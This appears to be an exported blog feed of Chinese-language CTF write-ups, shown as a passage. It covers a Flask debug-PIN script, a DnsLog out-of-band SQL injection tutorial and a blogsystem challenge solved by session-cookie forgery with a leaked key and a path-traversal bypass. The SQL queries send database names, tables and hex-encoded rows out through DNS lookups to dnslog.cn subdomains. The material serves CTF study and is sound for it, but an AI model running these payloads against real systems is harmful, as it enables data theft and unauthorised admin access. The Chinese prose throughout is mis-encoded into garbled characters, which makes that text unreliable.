class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        rv = num  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂæóÂà∞pinÔºåÁÑ∂ÂêéÂú®‰∏ãÈù¢ËøôÈáåËæìÂÖ•flag2ÂæóÂà∞</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201618.png" alt="image-20230226220150459"></p><p>ÂèÇËÄÉÔºö<br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_Ê∏ÖÈ£é‚ÄìÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag#nssctf-round7-shadowflag">Randark-JMT&#x2F;NSSCTF-Round_v7-ShadowFlag: A reverse challenge in NSSCTF Round#7 (github.com)</a><br>ËøôÈáåËøòÊúâ‰∏Ä‰∏™Ê≥ï‰∫åÔºåÊúâÂÖ¥Ë∂£ÂèØ‰ª•ÁúãÁúã<br><a href="https://www.cnblogs.com/nLesxw/p/web_shadowflag.html">NSS Round7_web - nLesxw - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DnsLogÂ§ñÂ∏¶Ê≥®ÂÖ•Â≠¶‰π†</title>
      <link href="/2022/12/DnsLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/12/DnsLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Â∫îÁî®Âú∫ÊôØ"><a href="#Â∫îÁî®Âú∫ÊôØ" class="headerlink" title="Â∫îÁî®Âú∫ÊôØ"></a>Â∫îÁî®Âú∫ÊôØ</h2><p> ÂΩìÊàë‰ª¨ÂØπ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìËøõË°åÊ≥®ÂÖ•Êó∂ÔºåÊó†ÂõûÊòæÔºå‰∏îÊó†Ê≥ïËøõË°åÊó∂Èó¥Ê≥®ÂÖ•ÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Âà©Áî®‰∏Ä‰∏™ÈÄöÈÅìÔºåÊääÊü•ËØ¢Âà∞Êï∞ÊçÆÈÄöËøáÈÄöÈÅìÂ∏¶Âá∫ÂéªÔºåËøôÈáåÁöÑÈÄöÈÅìÂåÖÊã¨ÔºöhttpËØ∑Ê±Ç„ÄÅDNSËß£Êûê„ÄÅSMBÊúçÂä°Á≠âÂ∞ÜÊï∞ÊçÆÂ∏¶Âá∫„ÄÇ</p><h2 id="DNSÊòØ‰ªÄ‰πà"><a href="#DNSÊòØ‰ªÄ‰πà" class="headerlink" title="DNSÊòØ‰ªÄ‰πà"></a>DNSÊòØ‰ªÄ‰πà</h2><p><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSÂéüÁêÜÂèäÂÖ∂Ëß£ÊûêËøáÁ®ã_king9666ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br>DNS( Domain Name System)ÊòØ‚ÄúÂüüÂêçÁ≥ªÁªü‚ÄùÁöÑËã±ÊñáÁº©ÂÜôÔºåÊòØ‰∏ÄÁßçÁªÑÁªáÊàêÂüüÂ±ÇÊ¨°ÁªìÊûÑÁöÑËÆ°ÁÆóÊú∫ÂíåÁΩëÁªúÊúçÂä°ÂëΩÂêçÁ≥ªÁªüÔºåÂÆÉÁî®‰∫éTCP&#x2F;IPÁΩëÁªúÔºåÂÆÉÊâÄÊèê‰æõÁöÑÊúçÂä°ÊòØÁî®Êù•Â∞Ü‰∏ªÊú∫ÂêçÂíåÂüüÂêçËΩ¨Êç¢‰∏∫IPÂú∞ÂùÄÁöÑÂ∑•‰Ωú„ÄÇDNSÂ∞±ÊòØËøôÊ†∑ÁöÑ‰∏Ä‰Ωç‚ÄúÁøªËØëËÄÖ‚Äù.<br>ÂêåÊó∂,DNSÊòØ‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÔºåÂÆÉÊèê‰æõÂ∞ÜÂüüÂêçËΩ¨Êç¢ÊàêÂØπÂ∫îIPÂú∞ÂùÄÁöÑ‰ø°ÊÅØ„ÄÇËøôÁßçÂ∞ÜÂêçÁß∞ËΩ¨Êç¢ÊàêIPÂú∞ÂùÄÁöÑÊñπÊ≥ïÁß∞‰∏∫ÂüüÂêçËß£Êûê„ÄÇÊâÄ‰ª•Âú®Áî≥ËØ∑ÂüüÂêçÁöÑÊó∂ÂÄôÈÉΩË¶ÅÂ∞ÜÂüüÂêçÊâÄÊåáÂêëÁöÑIPÂú∞ÂùÄÊèê‰∫§ÁªôNIC„ÄÇËøôÊ†∑Â∞±Ë¶ÅÊ±Ç‰Ω†ÁöÑIPÂøÖÈ°ªÊòØÂõ∫ÂÆöÁöÑÊâçÂèØ‰ª•Áî≥ËØ∑ÂüüÂêç„ÄÇ<br><strong>ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØÂ∞ÜÂüüÂêçËß£Êûê‰∏∫ip</strong></p><p>ÁÑ∂ÂêéÊàë‰ª¨Êâæ‰∏Ä‰∏™ÁâπÂÆöÁöÑÂèØ‰ª•ËÆ∞ÂΩïDNSËß£ÊûêÁöÑÁΩëÁ´ô<a href="http://dnslog.cn/">DNSLog Platform</a><br>Ëøô‰∏™ÁΩëÁ´ôÂ∞±ÂèØ‰ª•ÁúãÂà∞DNSËß£ÊûêËÆ∞ÂΩïÔºåÂ∞ÜÂõûÊòæÊâìÂà∞Ëøô‰∏™ÁΩëÁ´ô‰ªéËÄåÂÆûÁé∞Ê≥®ÂÖ•<br>ÂÖàÁúãÁúãÁΩëÁ´ôÁöÑ‰ΩøÁî®ÔºåËøõÂÖ•ÁÇπÂáªGet SubDomainÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∏™ÂüüÂêç<br><img src="https://s1.ax1x.com/2022/12/28/pSSpmQS.png" alt="pSSpmQS.png"><br>ÁÑ∂Âêéping‰∏Ä‰∏ãËøô‰∏™ÂüüÂêç<br><img src="https://s1.ax1x.com/2022/12/28/zzxNsH.png" alt="zzxNsH.png"><br>ÂèØ‰ª•ÁúãÂà∞ËÉΩÂ§üpingÈÄöÔºåËØ¥ÊòéDNSËß£ÊûêÊàêÂäüÔºåÁÑ∂ÂêéÂéªÁΩëÈ°µÁÇπÂáªRefresh RecordÂèØ‰ª•ÁúãÂà∞Ëß£ÊûêËÆ∞ÂΩï<br><img src="https://s1.ax1x.com/2022/12/28/zzxJzD.png" alt="zzxJzD.png"><br>ÁÑ∂ÂêéÂÆÉ‰πüÂèØ‰ª•Ëß£Êûêgum6ss.dnslog.cnÂüüÂêç‰∏ãÁöÑ‰ªª‰ΩïÂ≠êÂüüÂêç<br><img src="https://s1.ax1x.com/2022/12/28/zzx8JK.png" alt="zzx8JK.png"><br>ÂêåÊ†∑ÂèØ‰ª•Âú®ÁΩëÁ´ôÁúãÂà∞Ëß£ÊûêËÆ∞ÂΩï</p><h2 id="MySQL‰∏≠load-file"><a href="#MySQL‰∏≠load-file" class="headerlink" title="MySQL‰∏≠load_file()"></a>MySQL‰∏≠load_file()</h2><p>È¶ñÂÖàÂú®ÊàëÁîµËÑë<code>D:\MySQL</code>Ë∑ØÂæÑ‰∏ãÂáÜÂ§á‰∏Ä‰∏™a.txtÊñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫hello!ÔºåÁÑ∂ÂêéÂà©Áî®load_file()ÂáΩÊï∞ËØªÂèñ<br><img src="https://s1.ax1x.com/2022/12/28/zzxGRO.png" alt="zzxGRO.png"><br>ËØªÂèñÊàêÂäüÔºåËøôÈáåË∑ØÂæÑÂøÖÈ°ªÁî®&#x2F;ÊâçË°åÔºåËÄå‰∏îMySQLÁöÑÈÖçÁΩÆÊñá‰ª∂secure_file_privÂøÖÈ°ª‰∏∫Á©∫ÔºåÂç≥secure_file_priv&#x3D;‚Äù ‚Äú</p><h2 id="concat-ÂáΩÊï∞"><a href="#concat-ÂáΩÊï∞" class="headerlink" title="concat()ÂáΩÊï∞"></a>concat()ÂáΩÊï∞</h2><p>Ëøô‰∏™ÂáΩÊï∞Êå∫ÁÆÄÂçïÔºåÂ∞±ÊòØÁî®‰∫éÂ§ö‰∏™Â≠óÁ¨¶‰∏≤ÊãºÊé•<br><img src="https://s1.ax1x.com/2022/12/28/zzx3i6.png" alt="zzx3i6.png"></p><h2 id="Êú¨Âú∞ÊµãËØï"><a href="#Êú¨Âú∞ÊµãËØï" class="headerlink" title="Êú¨Âú∞ÊµãËØï"></a>Êú¨Âú∞ÊµãËØï</h2><p><strong>Ê†πÊçÆload_fileÂáΩÊï∞ÁöÑËØ≠Ê≥ïËßÑÂàôÔºåËÆøÈóÆ‰∫íËÅîÁΩë‰∏≠ÁöÑÊñá‰ª∂Êó∂ÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®ÊúÄÂâçÈù¢Âä†‰∏ä‰∏§‰∏™ÊñúÊù†  &#x2F;&#x2F;</strong><br>ÁÑ∂ÂêéÊàëÈáçÊñ∞Ëé∑Âèñ‰∏Ä‰∏™ÂüüÂêç‰∏∫d07ib5.dnslog.cnÔºåÁî®load_file()ÂáΩÊï∞Ëé∑ÂèñËøô‰∏™ÂüüÂêç‰∏ãÁöÑÊñá‰ª∂‰ªéËÄåÁïô‰∏ãËß£ÊûêËÆ∞ÂΩïÔºåËøôÈáåÁöÑÊñá‰ª∂ÈöèÊÑèÔºåÂõ†‰∏∫Êàë‰ª¨ÁöÑÁõÆÁöÑÊòØÁïô‰∏ãËÆ∞ÂΩïÔºåËÄå‰∏çÊòØÊü•ÁúãÊñá‰ª∂<br><img src="https://s1.ax1x.com/2022/12/28/zzxlIx.png" alt="zzxlIx.png"><br>ÂèØ‰ª•ÁúãÂà∞ÊàêÂäüÁïô‰∏ãËÆ∞ÂΩï<br><img src="https://s1.ax1x.com/2022/12/28/zzxQd1.png" alt="zzxQd1.png"></p><h3 id="Ëé∑ÂèñÂ∫ìÂêç"><a href="#Ëé∑ÂèñÂ∫ìÂêç" class="headerlink" title="Ëé∑ÂèñÂ∫ìÂêç"></a>Ëé∑ÂèñÂ∫ìÂêç</h3><p>ËøôÊ†∑Â∞±ÂèØ‰ª•ÈÄöËøáÊ≠§ÊñπÊ≥ïÂéªÊ≥®Âá∫Â∫ìÂêçÁ≠âÔºåÁÑ∂ÂêéÊàëÂàõÂª∫‰∏Ä‰∏™testÂ∫ìÔºå‰ΩøÁî®ËøôÁßçÊñπÊ≥ïÂéªÊ≥®ÂÖ•<br><img src="https://s1.ax1x.com/2022/12/28/zzxMZR.png" alt="zzxMZR.png"><br>ÁÑ∂ÂêéÂèØ‰ª•ÁúãÂà∞ÂæóÂà∞‰∫ÜtestÂ∫ìÂêç<br><img src="https://s1.ax1x.com/2022/12/28/zzxZzF.png" alt="zzxZzF.png"></p><h3 id="Ëé∑ÂèñË°®Âêç"><a href="#Ëé∑ÂèñË°®Âêç" class="headerlink" title="Ëé∑ÂèñË°®Âêç"></a>Ëé∑ÂèñË°®Âêç</h3><p>Êàë‰ª¨ÈúÄË¶ÅÊõ¥Êîπgroup_concatÂáΩÊï∞‰∏≠ÁöÑÈªòËÆ§ÈÄóÂè∑ÂàÜÈöîÁ¨¶ÔºåÂú®‰ΩøÁî®group_concatÂêàÂπ∂Êü•ËØ¢Êó∂Ôºå‰ºöËá™Âä®‰ΩøÁî® ‚Äú,‚Äù ËøûÊé•Êàë‰ª¨Êü•ËØ¢Âà∞ÁöÑÊØèÂÄºÔºå‰ΩÜÊòØÁî±‰∫é <code>, </code>Âú®url‰∏≠ÊòØ‰∏çÂÖÅËÆ∏Âá∫Áé∞ÁöÑÔºåÊâÄ‰ª•‰ΩøÁî®groupÊü•ËØ¢Âà∞ÁöÑÂÄºÂéªËß£ÊûêÊó∂ÂÄôÔºåmysqlÂ∞±‰ºöËÆ§‰∏∫Ëøô‰∏çÊòØ‰∏Ä‰∏™urlÂú∞ÂùÄÔºåÂ∞±‰∏ç‰ºöÂá∫Áé∞Ëß£ÊûêÁöÑÊìç‰ΩúÔºåÊâÄ‰ª•Â∞±Ê≤°Ê≥ïËé∑ÂèñÂà∞ÂÄºÔºåËøôÈáåÂèØ‰ª•Âà©Áî® . (ÁÇπÂè∑) ‰πüÂèØ‰ª•Áî® _ (‰∏ãÂàíÁ∫ø)ÔºåÂª∫ËÆÆÁöÑËØùÁî®ÁÇπÂ•ΩÊØîËæÉÂ•ΩÔºåÈò≤Ê≠¢Êï∞ÊçÆÂ∫ìÂ∫ìÂêç‰∏≠Êú¨Ë∫´Â≠òÂú®‰∏ãÂàíÁ∫ø<br>ËøôÈáåÊàëÁõ¥Êé•ÊääËØ≠Âè•ÊîæÂá∫Êù•‰∫ÜÔºåÊòØÁúüÁöÑÂÆπÊòìÊï≤Èîô<br><code>select load_file(concat(&#39;//&#39;,(select group_concat(table_name separator  &#39;.&#39;)from information_schema.tables where table_schema=database()),&#39;.d07ib5.dnslog.cn/11.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxEGT.png" alt="zzxEGT.png"><br>Êü•ËØ¢Âà∞Ë°®Âêç<br><img src="https://s1.ax1x.com/2022/12/28/zzxVRU.png" alt="zzxVRU.png"></p><h3 id="Êü•ÁúãÂ≠óÊÆµ"><a href="#Êü•ÁúãÂ≠óÊÆµ" class="headerlink" title="Êü•ÁúãÂ≠óÊÆµ"></a>Êü•ÁúãÂ≠óÊÆµ</h3><p><code>select load_file(concat(&#39;//&#39;,(select group_concat(column_name separator  &#39;.&#39;)from information_schema.columns where table_schema=database() and table_name=&#39;table1&#39;),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxmM4.png" alt="zzxmM4.png"><br>Êü•ËØ¢ÊàêÂäüÔºà‰∏≠ÈÄîÊç¢‰∫Ü‰∏™ÂüüÂêçÔºâ<br><img src="https://s1.ax1x.com/2022/12/28/zzxnsJ.png" alt="zzxnsJ.png"></p><h3 id="Êü•ÁúãÊï∞ÊçÆ"><a href="#Êü•ÁúãÊï∞ÊçÆ" class="headerlink" title="Êü•ÁúãÊï∞ÊçÆ"></a>Êü•ÁúãÊï∞ÊçÆ</h3><p>ÂΩìÊàë‰ΩøÁî®‰∏ãÈù¢ËØ≠Âè•<code> select load_file(concat(&#39;//&#39;,(select group_concat(id,user,name separator  &#39;.&#39;)from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code>Êü•ËØ¢Êï∞ÊçÆÂ∞±‰ºöÂ§±ÊïàÔºåÂõ†‰∏∫<br>url‰∏≠‰º†ÈÄíÁöÑÂ≠óÁ¨¶ÈùûÂ∏∏ÊúâÈôêÔºåÂæàÂ§öÁâπÊÆäÂ≠óÁ¨¶Â¶Ç <code>&#123; , &#125; , ÔºÅ</code>,ÊòØÊó†Ê≥ï‰º†ÈÄíÁöÑÔºåËøôÂ∞±‰ºöÂØºËá¥Êàë‰ª¨ÁöÑload_fileÂáΩÊï∞Â§±ÊïàÔºåËÄåÂú®flag‰∏≠Êã¨Âè∑‰ªÄ‰πàÁöÑ‰ºöÁªèÂ∏∏Âá∫Áé∞ÔºåÊâÄ‰ª•‰ΩøÁî®hexËøõË°åÁºñÁ†Å<br><code>select load_file(concat(&#39;//&#39;,(select hex(group_concat(id,user,name separator  &#39;.&#39;)) from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/pSSptQU.png" alt="pSSptQU.png"><br>ÂæóÂà∞<br><img src="https://s1.ax1x.com/2022/12/28/zzxuL9.png" alt="zzxuL9.png"><br>ÁÑ∂ÂêéËß£Á†ÅÂæóÂà∞Â≠óÊÆµÊï∞ÊçÆ<br><img src="https://s1.ax1x.com/2022/12/28/zzxtQe.png" alt="zzxtQe.png"></p><p>ÂèÇËÄÉÔºö<br><a href="https://blog.csdn.net/monster663/article/details/113757235">Ê∑±Â∫¶ÂâñÊûêDNSLogÊ≥®ÂÖ•ÂéüÁêÜ&amp;Êú¨Âú∞ÂÆû‰æãÊµãËØï_monster663ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_dnslogÊ≥®ÂÖ•ÂéüÁêÜ</a><br><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSÂéüÁêÜÂèäÂÖ∂Ëß£ÊûêËøáÁ®ã_king9666ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://www.freebuf.com/articles/web/259023.html">DNSlogÊ≥®ÂÖ•ËØ¶ÁªÜËß£Êûê - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022ÂçÅÊúàËµõ blogsystem</title>
      <link href="/2022/12/buu%E5%8D%81%E6%9C%88%E8%B5%9B-blogsystem/"/>
      <url>/2022/12/buu%E5%8D%81%E6%9C%88%E8%B5%9B-blogsystem/</url>
      
        <content type="html"><![CDATA[<p><strong>È¶ñÂÖàÂæóÊÑüË∞¢<a href="https://www.lengf233.top/">lengf</a>Â∏àÂÇÖÁªôËß£Á≠î‰∏Ä‰∫õÂæàÂÇªÁöÑÈóÆÈ¢ò</strong></p><p>Ëøô‰∏™È¢òÂêéÈù¢Ê∂âÂèäÂà∞ÁöÑÁü•ËØÜÁÇπ‰πãÂâçËøòÊ≤°Â≠¶ËøáÔºåÂÖàÁúãÁúãÂêß<br>ËøõÂÖ•È¢òÁõÆÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑ÂèëÁé∞adminÂ∑≤ÁªèË¢´Ê≥®ÂÜåÔºåËøôÈáåÂ∞±Ë¶ÅÊÉ≥Âà∞session‰º™ÈÄ†Ôºå‰ª•adminÁôªÂΩï<br>Ë¶Å‰º™ÈÄ†sessionÂ∞±ÂæóÁü•ÈÅìkeyÔºåÂú®BlogË∑ØÁî±ÁöÑ<code>flask Âü∫Á°ÄÊÄªÁªì</code>ËøôÁØáÊñáÁ´†ÊâæÂà∞key<br><img src="https://s1.ax1x.com/2022/12/27/zzBSnx.png" alt="zzBSnx.png"><br>ÁÑ∂ÂêéÁî®Â∑•ÂÖ∑‰º™ÈÄ†<br><code>python flask_session_cookie_manager3.py encode -s 7his_1s_my_fav0rite_ke7 -t &quot;&#123;&#39;_permanent&#39;:True,&#39;username&#39;:&#39;admin&#39;&#125;&quot;</code><br>‰ª•adminÁôªÂΩï‰ºöÂèëÁé∞Â§ö‰∫Ü‰∏Ä‰∏™DownloadË∑ØÁî±<br><img src="https://s1.ax1x.com/2022/12/27/zzBpB6.png" alt="zzBpB6.png"><br>ÁÇπËøõÂÖ•ÊòØ‰∏ÄÂº†ÂõæÁâáÔºåÊäìÂåÖÔºåÂ≠òÂú®ÁõÆÂΩïÁ©øË∂äÔºåËøôÈáåÊòØÁî®<code>.//./</code>ÁªïËøáÔºåÊ∫êÁ†ÅËøáÊª§ÊñπÂºè‰∏∫<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code><br><img src="https://s1.ax1x.com/2022/12/27/zzB9HK.png" alt="zzB9HK.png"><br>Ê∫êÁ†ÅÂú®app&#x2F;app.py<br><img src="https://s1.ax1x.com/2022/12/27/zzBiND.png" alt="zzBiND.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> config  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.config.from_object(config)  </span><br><span class="line">app.secret_key = <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span>  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> view <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">app.register_blueprint(index, name=<span class="string">&#x27;index&#x27;</span>)  </span><br><span class="line">app.register_blueprint(blog, name=<span class="string">&#x27;blog&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.context_processor  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_statue</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> username:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">            <span class="keyword">if</span> user:  </span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&#x27;name&#x27;</span>: user.name, <span class="string">&#x27;password&#x27;</span>: user.password&#125;  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> e  </span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>ÈÄöËøáÂØºÂÖ•Ê®°ÂùóÂà§Êñ≠ÊòØMVTÊû∂ÊûÑÔºåÊêúÁ¥¢‰∏ÄÊ≥¢</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp myweb</span><br><span class="line"></span><br><span class="line">ËøôÂ∞ÜÂàõÂª∫‰∏Ä‰∏™ÁõÆÂΩïmywebÔºåÂÖ∂ÁõÆÂΩïÂ¶Ç‰∏ãÔºöÊ≠§ÁõÆÂΩïÁªìÊûÑÂ∞ÜÂÆπÁ∫≥ËΩÆËØ¢Â∫îÁî®Á®ãÂ∫è„ÄÇ</span><br><span class="line"></span><br><span class="line">[<span class="meta">root@localhost demo</span>]<span class="meta"># tree mysite/</span></span><br><span class="line">mysite/</span><br><span class="line">‚îú‚îÄ‚îÄ manage.py</span><br><span class="line">‚îú‚îÄ‚îÄ mysite</span><br><span class="line">‚îÇ   ‚îú‚îÄ‚îÄ __init__.py</span><br><span class="line">‚îÇ   ‚îú‚îÄ‚îÄ settings.py</span><br><span class="line">‚îÇ   ‚îú‚îÄ‚îÄ urls.py</span><br><span class="line">‚îÇ   ‚îî‚îÄ‚îÄ wsgi.py</span><br><span class="line">‚îî‚îÄ‚îÄ myweb</span><br><span class="line">    ‚îú‚îÄ‚îÄ admin.py</span><br><span class="line">    ‚îú‚îÄ‚îÄ apps.py</span><br><span class="line">    ‚îú‚îÄ‚îÄ __init__.py</span><br><span class="line">    ‚îú‚îÄ‚îÄ migrations</span><br><span class="line">    ‚îÇ   ‚îî‚îÄ‚îÄ __init__.py</span><br><span class="line">    ‚îú‚îÄ‚îÄ models.py</span><br><span class="line">    ‚îú‚îÄ‚îÄ tests.py</span><br><span class="line">    ‚îî‚îÄ‚îÄ views.py</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÂÖ∂ÁªìÊûÑÔºåÁÑ∂ÂêéËØªÂèñ<code>view/__init__.py</code>ÂèëÁé∞Âú®ÂÖ∂‰∏≠ÂèàÂØºÂÖ•‰∫ÜÂÖ∂‰ªñÊ®°Âùó<br><img src="https://s1.ax1x.com/2022/12/27/zzBPAO.png" alt="zzBPAO.png"><br>Êé•ÁùÄËØªÂèñindex.pyÂíåblog.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//index.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file  </span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line">index = Blueprint(<span class="string">&quot;index&quot;</span>, __name__)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span 